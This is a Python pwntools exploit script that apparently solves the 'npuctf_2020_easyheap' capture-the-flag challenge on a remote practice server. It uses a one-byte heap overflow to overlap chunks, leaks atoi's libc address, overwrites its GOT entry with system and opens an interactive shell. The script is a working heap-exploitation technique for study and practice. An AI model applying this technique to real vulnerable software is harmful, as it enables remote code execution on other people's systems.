from pwn import *
from LibcSearcher import *

target = remote('node4.buuoj.cn', 27505)
context.log_level = 'debug'

elf = ELF('npuctf_2020_easyheap')
libc = ELF('libc-2.27.so')

atoi_got = elf.got['atoi']

def new(size, content):
  # 24 or 56
  target.sendlineafter(':', '1')
  target.sendlineafter(':', str(size))
  target.sendlineafter(':', content)

def edit(index, content):
  target.sendlineafter(':', '2')
  target.sendlineafter(':', str(index))
  target.sendafter(':', content)

def show(index):
  target.sendlineafter(':', '3')
  target.sendlineafter(':', str(index))

def delete(index):
  target.sendlineafter(':', '4')
  target.sendlineafter(':', str(index))


new(0x18, b'a')
new(0x18, b'a')
# Dummy.
new(0x18, b'a')
edit(0, b'a' * 0x18 + p8(0x41))
delete(1)

new(0x38, b'a' * 0x10 + p64(0x0) + p64(0x21) + p64(0x100) + p64(atoi_got))
show(1)

atoi_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
system = atoi_addr - libc.sym['atoi'] + libc.sym['system']

# Modify atoi.
edit(1, p64(system))

target.interactive()
